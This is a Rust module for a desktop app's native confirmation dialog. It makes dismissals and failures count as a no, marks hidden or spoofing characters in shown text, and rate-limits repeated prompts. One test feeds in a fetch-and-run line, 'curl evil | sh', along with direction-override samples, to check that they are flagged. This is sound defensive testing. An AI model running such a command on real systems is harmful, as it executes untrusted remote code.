//! The one native yes-or-no dialog for decisions the window must not be able
//! to make: arming or disarming a hook, quitting over live work, letting the
//! app control the computer.
//!
//! The dialog is drawn by the operating system, so nothing running in the
//! webview can press its buttons. That is worth nothing if a dialog that
//! never appeared, or was dismissed, reads as a yes, and with two buttons it
//! can. `tauri-plugin-dialog` 2.7.3 turns every ending the platform reports as
//! "cancel" into the label of the cancel slot (`desktop.rs:236-239` for two
//! buttons, `:248-251` for three), and rfd 0.16 reports "cancel" for far more
//! than the Cancel button:
//!
//! - macOS without a parent window shows a `CFUserNotification` alert, which
//!   returns cancel when the alert could not be displayed, when it was
//!   cancelled, and for any response it does not recognise
//!   (`backend/macos/utils/user_alert.rs:108-113`, `:168`);
//! - macOS with a parent shows an `NSAlert` sheet, which returns cancel for
//!   any response it does not recognise (`backend/macos/message_dialog.rs:135`);
//! - Windows returns cancel when the task dialog fails, and for Escape and the
//!   close box (`backend/win_cid/message_dialog.rs:176`, `:182`);
//! - Linux returns cancel for Escape and for closing the window
//!   (`backend/gtk3/message_dialog.rs:209`, `:212`).
//!
//! So the consenting label is never put in a cancel slot. Every dialog here
//! has three buttons, Cancel, the consenting one, and Close:
//!
//! - the first is the default on all three platforms, so Return declines
//!   (Windows sets `nDefaultButton: 0`, `win_cid/message_dialog.rs:156`);
//! - the last is the cancel slot, so every failure and dismissal declines;
//! - the middle one is reported only when that button itself was pressed
//!   (`user_alert.rs:158-162`, `macos/message_dialog.rs:129-131`,
//!   `win_cid/message_dialog.rs:196`, `gtk3/message_dialog.rs:211` with
//!   `desktop.rs:244-247`).
//!
//! The answer is yes only for the exact consenting label. Anything else,
//! including a dialog whose answer never arrives, is no.
//!
//! On macOS the dialog is always a sheet on the main window, and when that
//! window cannot be put on screen nothing is asked and the answer is no.
//! Without a parent rfd shows a `CFUserNotification` alert whose buttons are
//! Core Foundation's default, alternate and other, in that order
//! (`user_alert.rs:71-73`), so the consenting button would be the alternate.
//! Core Foundation documents Return for the default button and reports
//! `kCFUserNotificationDefaultResponse`, `AlternateResponse`,
//! `OtherResponse` or `CancelResponse`, but neither it nor rfd says which of
//! them Escape produces: the alert is drawn by a system agent, not by this
//! process. An alternate button is conventionally the cancelling one there,
//! so Escape reaching it cannot be ruled out by reading, and that path is not
//! taken. As a sheet the dialog is an `NSAlert`, where AppKit gives Return to
//! the first button and Escape to a button titled "Cancel", which is the
//! first one too. Windows and Linux need no window: Escape and the close box
//! are reported as cancel there whether or not there is a parent.
//!
//! What a dialog shows is as much a part of the decision as its buttons, so
//! the rules for that live here too: [`shown_value`] marks everything that
//! would not look like what it is, and [`check_it_fits`] refuses a body the
//! dialog could not show whole.

use tauri::Manager;
use tauri_plugin_dialog::{
    DialogExt, MessageDialogButtons, MessageDialogKind, MessageDialogResult,
};

pub const CANCEL_LABEL: &str = "Cancel";
pub const CLOSE_LABEL: &str = "Close";

/// A question only the user may answer, and the label of the one button
/// that answers yes.
#[derive(Debug, Clone)]
pub struct NativeConfirm {
    pub title: String,
    pub body: String,
    pub confirm_label: String,
}

/// `None` for a consenting label that could be mistaken for a declining one.
fn buttons(confirm_label: &str) -> Option<MessageDialogButtons> {
    let label = confirm_label.trim();
    let declines = [CANCEL_LABEL, CLOSE_LABEL]
        .iter()
        .any(|declining| declining.eq_ignore_ascii_case(label));
    if label.is_empty() || declines {
        return None;
    }
    Some(MessageDialogButtons::YesNoCancelCustom(
        CANCEL_LABEL.to_string(),
        confirm_label.to_string(),
        CLOSE_LABEL.to_string(),
    ))
}

fn is_confirmed(result: &MessageDialogResult, confirm_label: &str) -> bool {
    buttons(confirm_label).is_some()
        && matches!(result, MessageDialogResult::Custom(label) if label == confirm_label)
}

#[cfg(test)]
pub(crate) fn can_ask_with(confirm_label: &str) -> bool {
    buttons(confirm_label).is_some()
}

const LINE_BREAK_MARK: &str = " ⏎ ";
const TAB_MARK: char = '⇥';
const HIDDEN_CHARACTER_MARK: char = '\u{FFFD}';

fn is_line_break(c: char) -> bool {
    matches!(c, '\n' | '\r' | '\u{2028}' | '\u{2029}')
}

/// A character that takes up no room, changes the order the rest is drawn
/// in, or is blank without being the ordinary space. Text holding one would
/// not look like what it is, and a run of blank ones could push a row out of
/// sight. That is every control character, the soft hyphen, the zero-width
/// and direction characters, every space separator but U+0020, the blank
/// braille cell, the Hangul fillers, and the tag characters.
fn is_hidden(c: char) -> bool {
    c.is_control()
        || matches!(
            c,
            '\u{00A0}'
                | '\u{00AD}'
                | '\u{115F}'
                | '\u{1160}'
                | '\u{1680}'
                | '\u{2000}'..='\u{200F}'
                | '\u{202A}'..='\u{202F}'
                | '\u{205F}'..='\u{2069}'
                | '\u{2800}'
                | '\u{3000}'
                | '\u{3164}'
                | '\u{FEFF}'
                | '\u{FFA0}'
                | '\u{E0000}'..='\u{E007F}'
        )
}

/// Any text as a dialog shows it: on one line, with every line break, tab
/// and hidden or blank character marked, and the line count said when there
/// is more than one line. A name, a path or a value treated this way cannot
/// start a row of its own, hide part of itself or pad a row out of view.
pub fn shown_value(text: &str) -> String {
    let mut marked = String::with_capacity(text.len());
    let mut breaks = 0_usize;
    let mut characters = text.chars().peekable();
    while let Some(c) = characters.next() {
        if is_line_break(c) {
            if c == '\r' && characters.peek() == Some(&'\n') {
                characters.next();
            }
            breaks += 1;
            marked.push_str(LINE_BREAK_MARK);
        } else if c == '\t' {
            marked.push(TAB_MARK);
        } else if is_hidden(c) {
            marked.push(HIDDEN_CHARACTER_MARK);
        } else {
            marked.push(c);
        }
    }
    match breaks {
        0 if marked.is_empty() => "(empty)".to_string(),
        0 => marked,
        _ => format!("[{} lines] {marked}", breaks + 1),
    }
}

/// A native dialog cannot scroll. Its text wraps, so what matters is how
/// many rows the text takes, not how many line breaks it has. The narrowest
/// dialog this is shown in is the macOS alert, about 260 points wide, which
/// holds roughly 40 characters of its informative text to a row; a body is
/// measured against that, and one that would take more rows than a laptop
/// screen shows is not asked about at all.
pub const ASSUMED_ROW_CHARS: usize = 40;
pub const MAX_DIALOG_ROWS: usize = 40;

/// The rows a body takes when each of its lines wraps at
/// [`ASSUMED_ROW_CHARS`]. An empty line is a row.
pub fn rows_needed(body: &str) -> usize {
    body.lines()
        .map(|line| line.chars().count().div_ceil(ASSUMED_ROW_CHARS).max(1))
        .sum()
}

/// `Err` is the number of rows a body needs when the dialog cannot show
/// that many, so the caller can refuse to ask rather than ask about text
/// the user would not see.
pub fn check_it_fits(body: &str) -> Result<(), usize> {
    let rows = rows_needed(body);
    if rows > MAX_DIALOG_ROWS {
        Err(rows)
    } else {
        Ok(())
    }
}

/// The main window, brought forward, when it is on screen.
fn main_window_on_screen<R: tauri::Runtime>(
    app: &tauri::AppHandle<R>,
) -> Option<tauri::WebviewWindow<R>> {
    crate::focus_running_instance(app);
    app.get_webview_window("main")
        .filter(|window| window.is_visible().unwrap_or(false))
}

/// Asks in a native dialog and resolves `true` only if the user pressed the
/// button labelled `confirm_label`.
///
/// The main window is brought forward and the dialog attached to it. On
/// macOS it must be: with no window to attach to nothing is asked and the
/// answer is no, see the module note. The call does not hold a runtime
/// thread: the answer comes back on a channel.
pub async fn confirm<R: tauri::Runtime>(
    app: &tauri::AppHandle<R>,
    question: NativeConfirm,
) -> bool {
    let NativeConfirm {
        title,
        body,
        confirm_label,
    } = question;
    let Some(buttons) = buttons(&confirm_label) else {
        tracing::error!(
            "[native-confirm] '{}' cannot label the consenting button; nothing was asked",
            confirm_label
        );
        return false;
    };

    let (answer_tx, answer_rx) = tokio::sync::oneshot::channel();
    {
        let mut dialog = app
            .dialog()
            .message(body)
            .title(title)
            .kind(MessageDialogKind::Warning)
            .buttons(buttons);
        match main_window_on_screen(app) {
            Some(window) => dialog = dialog.parent(&window),
            None if cfg!(target_os = "macos") => {
                tracing::warn!(
                    "[native-confirm] the main window could not be shown, so '{}' was not asked",
                    confirm_label
                );
                return false;
            }
            None => {}
        }
        dialog.show_with_result(move |result| {
            let _ = answer_tx.send(result);
        });
    }

    answer_rx
        .await
        .map(|result| is_confirmed(&result, &confirm_label))
        .unwrap_or(false)
}

/// Why a [`ConfirmGate`] did not ask.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NotAsked {
    /// Another of this gate's dialogs is open.
    AlreadyAsking,
    /// Something else was declined a moment ago; ask again in this many
    /// seconds.
    JustDeclined { seconds: u64 },
    /// This exact request was declined a moment ago; ask again in this many
    /// seconds.
    DeclinedThis { seconds: u64 },
}

impl NotAsked {
    /// What to tell whoever made the request.
    pub fn message(self) -> String {
        match self {
            Self::AlreadyAsking => {
                "Another confirmation is already open. Answer it first, then try again.".to_string()
            }
            Self::JustDeclined { seconds } => {
                format!("A confirmation was just declined. Try again in {seconds} seconds.")
            }
            Self::DeclinedThis { seconds } => {
                format!("You declined this a moment ago. Try again in {seconds} seconds.")
            }
        }
    }
}

/// How long the same request waits after its first no, and any other
/// request after a first no. Each further no in a row doubles the wait, up
/// to [`LONGEST_WAIT`].
pub const WAIT_AFTER_DECLINING_IT: std::time::Duration = std::time::Duration::from_secs(30);
pub const WAIT_AFTER_ANY_DECLINE: std::time::Duration = std::time::Duration::from_secs(10);
pub const LONGEST_WAIT: std::time::Duration = std::time::Duration::from_secs(300);

/// The most requests a gate keeps a count of noes for.
const MAX_COUNTED_REQUESTS: usize = 256;

/// The wait after the `noes`-th no in a row: `first`, doubled for each no
/// after the first, and never more than [`LONGEST_WAIT`].
fn wait_after(noes: u32, first: std::time::Duration) -> std::time::Duration {
    let doublings = noes.saturating_sub(1).min(16);
    first.saturating_mul(1_u32 << doublings).min(LONGEST_WAIT)
}

/// The whole seconds left of `wait` since `since`, or `None` when it is over.
fn seconds_left(
    since: std::time::Instant,
    wait: std::time::Duration,
    now: std::time::Instant,
) -> Option<u64> {
    let left = wait.checked_sub(now.saturating_duration_since(since))?;
    if left.is_zero() {
        return None;
    }
    Some(left.as_secs() + u64::from(left.subsec_nanos() > 0))
}

struct Declined {
    at: std::time::Instant,
    noes: u32,
}

#[derive(Default)]
struct GateState {
    asking: bool,
    last_no: Option<std::time::Instant>,
    noes_in_a_row: u32,
    declined: std::collections::BTreeMap<String, Declined>,
}

/// Keeps one kind of native question from being used to wear the user down
/// while leaving a person who cancelled by mistake free to try again.
///
/// One dialog at a time. After a no the same request waits
/// [`WAIT_AFTER_DECLINING_IT`] and any other request
/// [`WAIT_AFTER_ANY_DECLINE`]; each further no in a row, of that request or
/// of anything, doubles its wait up to [`LONGEST_WAIT`], so a loop is slowed
/// to one dialog every five minutes. A yes clears the run. The refusal says
/// how many seconds are left. Each kind of decision owns a gate, so a no to
/// one kind does not hold up another.
pub struct ConfirmGate {
    state: std::sync::Mutex<Option<GateState>>,
}

impl ConfirmGate {
    pub const fn new() -> Self {
        Self {
            state: std::sync::Mutex::new(None),
        }
    }

    fn with_state<T>(&self, change: impl FnOnce(&mut GateState) -> T) -> T {
        let mut state = match self.state.lock() {
            Ok(state) => state,
            Err(poisoned) => poisoned.into_inner(),
        };
        change(state.get_or_insert_with(GateState::default))
    }

    fn open(&self, request: &str, now: std::time::Instant) -> Result<(), NotAsked> {
        self.with_state(|state| {
            if state.asking {
                return Err(NotAsked::AlreadyAsking);
            }
            if let Some(seconds) = state.declined.get(request).and_then(|declined| {
                seconds_left(
                    declined.at,
                    wait_after(declined.noes, WAIT_AFTER_DECLINING_IT),
                    now,
                )
            }) {
                return Err(NotAsked::DeclinedThis { seconds });
            }
            if let Some(seconds) = state.last_no.and_then(|last_no| {
                seconds_left(
                    last_no,
                    wait_after(state.noes_in_a_row, WAIT_AFTER_ANY_DECLINE),
                    now,
                )
            }) {
                return Err(NotAsked::JustDeclined { seconds });
            }
            state.asking = true;
            Ok(())
        })
    }

    fn close(&self, request: &str, confirmed: bool, now: std::time::Instant) {
        self.with_state(|state| {
            state.asking = false;
            if confirmed {
                state.last_no = None;
                state.noes_in_a_row = 0;
                state.declined.remove(request);
                return;
            }
            state.last_no = Some(now);
            state.noes_in_a_row = state.noes_in_a_row.saturating_add(1);
            if state.declined.len() >= MAX_COUNTED_REQUESTS && !state.declined.contains_key(request)
            {
                state.declined.clear();
            }
            let declined = state
                .declined
                .entry(request.to_string())
                .or_insert(Declined { at: now, noes: 0 });
            declined.at = now;
            declined.noes = declined.noes.saturating_add(1);
        });
    }

    /// Asks through [`confirm`] unless this gate holds the request back.
    /// `request` identifies the exact thing asked, so that a no to it is
    /// counted against it; two requests that would show different dialogs
    /// must not share one.
    pub async fn confirm<R: tauri::Runtime>(
        &self,
        app: &tauri::AppHandle<R>,
        request: &str,
        question: NativeConfirm,
    ) -> Result<bool, NotAsked> {
        self.open(request, std::time::Instant::now())?;
        let confirmed = confirm(app, question).await;
        self.close(request, confirmed, std::time::Instant::now());
        Ok(confirmed)
    }
}

impl Default for ConfirmGate {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const CONFIRM: &str = "Arm Hooks";

    /// What rfd 0.16 can hand back.
    #[derive(Debug, Clone, PartialEq, Eq)]
    enum Native {
        Ok,
        Cancel,
        Yes,
        No,
        Custom(String),
    }

    /// `tauri-plugin-dialog` 2.7.3, `desktop.rs:228-253`, followed by the
    /// `From<rfd::MessageDialogResult>` in `models.rs:82-92`.
    fn as_the_plugin_reports(
        native: Native,
        buttons: &MessageDialogButtons,
    ) -> MessageDialogResult {
        use MessageDialogButtons::{OkCancelCustom, OkCustom, YesNoCancelCustom};
        match (native, buttons) {
            (Native::Ok, OkCustom(ok)) => MessageDialogResult::Custom(ok.clone()),
            (Native::Ok, OkCancelCustom(ok, _)) => MessageDialogResult::Custom(ok.clone()),
            (Native::Cancel, OkCancelCustom(_, cancel)) => {
                MessageDialogResult::Custom(cancel.clone())
            }
            (Native::Yes, YesNoCancelCustom(yes, _, _)) => MessageDialogResult::Custom(yes.clone()),
            (Native::No, YesNoCancelCustom(_, no, _)) => MessageDialogResult::Custom(no.clone()),
            (Native::Cancel, YesNoCancelCustom(_, _, cancel)) => {
                MessageDialogResult::Custom(cancel.clone())
            }
            (Native::Ok, _) => MessageDialogResult::Ok,
            (Native::Cancel, _) => MessageDialogResult::Cancel,
            (Native::Yes, _) => MessageDialogResult::Yes,
            (Native::No, _) => MessageDialogResult::No,
            (Native::Custom(label), _) => MessageDialogResult::Custom(label),
        }
    }

    fn every_native_result() -> Vec<Native> {
        vec![
            Native::Ok,
            Native::Cancel,
            Native::Yes,
            Native::No,
            Native::Custom(CANCEL_LABEL.to_string()),
            Native::Custom(CLOSE_LABEL.to_string()),
            Native::Custom("something else".to_string()),
            Native::Custom(CONFIRM.to_string()),
        ]
    }

    #[test]
    fn the_consenting_button_is_always_the_middle_of_three() {
        match buttons(CONFIRM) {
            Some(MessageDialogButtons::YesNoCancelCustom(first, middle, last)) => {
                assert_eq!(first, CANCEL_LABEL, "Return presses the first button");
                assert_eq!(middle, CONFIRM);
                assert_eq!(last, CLOSE_LABEL, "every fallback reports the last button");
            }
            other => panic!("unexpected buttons: {other:?}"),
        }
    }

    /// Linux reports the middle button as a bare `No`, which the plugin turns
    /// into its label; macOS and Windows report the label themselves. Those
    /// two are the only native results that say yes.
    #[test]
    fn only_a_press_of_the_consenting_button_says_yes() {
        let layout = buttons(CONFIRM).expect("a usable label");

        for native in every_native_result() {
            let pressed_it = matches!(&native, Native::No)
                || matches!(&native, Native::Custom(label) if label == CONFIRM);
            let reported = as_the_plugin_reports(native.clone(), &layout);

            assert_eq!(
                is_confirmed(&reported, CONFIRM),
                pressed_it,
                "{native:?} reported as {reported:?}"
            );
        }
    }

    /// A dialog that could not be shown, was cancelled or was closed comes
    /// back as cancel. With two buttons that is the second label, which is
    /// how a consenting label placed second said yes with nobody pressing it.
    #[test]
    fn a_failed_or_dismissed_dialog_lands_on_the_last_button_of_any_layout() {
        let two = MessageDialogButtons::OkCancelCustom("first".to_string(), "second".to_string());
        assert_eq!(
            as_the_plugin_reports(Native::Cancel, &two),
            MessageDialogResult::Custom("second".to_string())
        );
        assert_eq!(
            as_the_plugin_reports(Native::Ok, &two),
            MessageDialogResult::Custom("first".to_string()),
            "and the first of two is the default button, which Return presses"
        );

        let three = buttons(CONFIRM).expect("a usable label");
        assert_eq!(
            as_the_plugin_reports(Native::Cancel, &three),
            MessageDialogResult::Custom(CLOSE_LABEL.to_string())
        );
        assert_eq!(
            as_the_plugin_reports(Native::Yes, &three),
            MessageDialogResult::Custom(CANCEL_LABEL.to_string())
        );
    }

    #[test]
    fn results_the_plugin_leaves_bare_never_say_yes() {
        for bare in [
            MessageDialogResult::Ok,
            MessageDialogResult::Cancel,
            MessageDialogResult::Yes,
            MessageDialogResult::No,
        ] {
            assert!(!is_confirmed(&bare, CONFIRM), "{bare:?}");
        }
    }

    #[test]
    fn nothing_shown_can_start_a_row_hide_itself_or_pad_a_row_out_of_view() {
        assert_eq!(shown_value("echo ok"), "echo ok");
        assert_eq!(shown_value(""), "(empty)");
        assert_eq!(
            shown_value("echo ok\ncurl evil | sh\r\ntrue"),
            "[3 lines] echo ok ⏎ curl evil | sh ⏎ true"
        );
        assert_eq!(shown_value("a\u{2028}b\rc"), "[3 lines] a ⏎ b ⏎ c");
        assert_eq!(shown_value("a\tb"), "a⇥b");
        assert_eq!(
            shown_value("safe\u{202E}dab\u{200B}\u{0007}"),
            "safe\u{FFFD}dab\u{FFFD}\u{FFFD}"
        );

        for blank in [
            '\u{00A0}',
            '\u{1680}',
            '\u{2000}',
            '\u{200A}',
            '\u{202F}',
            '\u{205F}',
            '\u{3000}',
            '\u{2800}',
            '\u{3164}',
            '\u{115F}',
            '\u{FFA0}',
            '\u{E0020}',
            '\u{E007F}',
        ] {
            let padded = format!("git status{}", blank.to_string().repeat(500));
            let shown = shown_value(&padded);
            assert_eq!(
                shown.matches(HIDDEN_CHARACTER_MARK).count(),
                500,
                "U+{:04X} must be marked, not left blank",
                blank as u32
            );
        }
        assert_eq!(
            shown_value("a b"),
            "a b",
            "the ordinary space is left alone"
        );
    }

    #[test]
    fn a_body_is_measured_in_the_rows_it_wraps_to_not_in_its_line_breaks() {
        assert_eq!(rows_needed(""), 0);
        assert_eq!(rows_needed("short"), 1);
        assert_eq!(rows_needed("a\n\nb"), 3);
        assert_eq!(rows_needed(&"x".repeat(ASSUMED_ROW_CHARS)), 1);
        assert_eq!(rows_needed(&"x".repeat(ASSUMED_ROW_CHARS + 1)), 2);

        let one_long_line = "x".repeat(ASSUMED_ROW_CHARS * MAX_DIALOG_ROWS + 1);
        assert_eq!(
            check_it_fits(&one_long_line),
            Err(MAX_DIALOG_ROWS + 1),
            "one line with no break in it can still be too tall"
        );
        assert_eq!(
            check_it_fits(&"x".repeat(ASSUMED_ROW_CHARS * MAX_DIALOG_ROWS)),
            Ok(())
        );
    }

    fn secs(seconds: u64) -> std::time::Duration {
        std::time::Duration::from_secs(seconds)
    }

    /// Declines `request` at `at`, which must be a moment the gate lets it
    /// be asked.
    fn decline(gate: &ConfirmGate, request: &str, at: std::time::Instant) {
        assert_eq!(gate.open(request, at), Ok(()), "{request} may be asked");
        gate.close(request, false, at);
    }

    #[test]
    fn a_gate_asks_one_at_a_time() {
        let gate = ConfirmGate::new();
        let now = std::time::Instant::now();

        assert_eq!(gate.open("arm a", now), Ok(()));
        assert_eq!(gate.open("arm b", now), Err(NotAsked::AlreadyAsking));
        assert_eq!(gate.open("arm a", now), Err(NotAsked::AlreadyAsking));

        gate.close("arm a", true, now);
        assert_eq!(gate.open("arm b", now), Ok(()), "a yes holds nothing back");
    }

    #[test]
    fn a_declined_request_waits_thirty_seconds_and_can_then_be_asked_again() {
        let gate = ConfirmGate::new();
        let start = std::time::Instant::now();
        decline(&gate, "arm a", start);

        assert_eq!(
            gate.open("arm a", start),
            Err(NotAsked::DeclinedThis { seconds: 30 })
        );
        assert_eq!(
            gate.open("arm a", start + std::time::Duration::from_millis(29_500)),
            Err(NotAsked::DeclinedThis { seconds: 1 }),
            "a part of a second is still a wait"
        );
        assert_eq!(
            NotAsked::DeclinedThis { seconds: 12 }.message(),
            "You declined this a moment ago. Try again in 12 seconds."
        );

        assert_eq!(
            gate.open("arm a", start + secs(30)),
            Ok(()),
            "a person who cancelled by mistake can approve it without restarting"
        );
        gate.close("arm a", true, start + secs(30));
        assert_eq!(gate.open("arm a", start + secs(30)), Ok(()));
    }

    #[test]
    fn each_further_no_to_the_same_request_doubles_its_wait_up_to_five_minutes() {
        let gate = ConfirmGate::new();
        let mut at = std::time::Instant::now();

        for expected in [30, 60, 120, 240, 300, 300, 300] {
            decline(&gate, "arm a", at);
            assert_eq!(
                gate.open("arm a", at),
                Err(NotAsked::DeclinedThis { seconds: expected })
            );
            assert_eq!(
                gate.open("arm a", at + secs(expected - 1)),
                Err(NotAsked::DeclinedThis { seconds: 1 })
            );
            at += secs(expected);
        }
        assert_eq!(wait_after(u32::MAX, WAIT_AFTER_DECLINING_IT), LONGEST_WAIT);
    }

    #[test]
    fn a_different_request_after_a_no_waits_too_and_longer_with_every_no_in_a_row() {
        let gate = ConfirmGate::new();
        let mut at = std::time::Instant::now();

        for (index, expected) in [10, 20, 40, 80, 160, 300, 300].into_iter().enumerate() {
            decline(&gate, &format!("arm {index}"), at);
            assert_eq!(
                gate.open("something else", at),
                Err(NotAsked::JustDeclined { seconds: expected }),
                "a loop that changes the request each time is slowed the same way"
            );
            at += secs(expected);
        }
        assert_eq!(
            NotAsked::JustDeclined { seconds: 10 }.message(),
            "A confirmation was just declined. Try again in 10 seconds."
        );
    }

    #[test]
    fn a_yes_ends_the_run_of_noes() {
        let gate = ConfirmGate::new();
        let start = std::time::Instant::now();
        decline(&gate, "arm a", start);
        decline(&gate, "arm b", start + secs(10));

        let later = start + secs(40);
        assert_eq!(gate.open("arm c", later), Ok(()));
        gate.close("arm c", true, later);

        decline(&gate, "arm d", later);
        assert_eq!(
            gate.open("arm e", later),
            Err(NotAsked::JustDeclined { seconds: 10 }),
            "the wait starts over after a yes"
        );
    }

    #[test]
    fn a_label_that_reads_as_declining_is_never_asked_with_and_never_confirms() {
        for label in ["Cancel", "cancel", " Close ", "CLOSE", "", "   "] {
            assert!(buttons(label).is_none(), "{label:?}");
            assert!(!can_ask_with(label));
            assert!(
                !is_confirmed(&MessageDialogResult::Custom(label.to_string()), label),
                "{label:?}"
            );
        }
        assert!(can_ask_with(CONFIRM));
    }
}
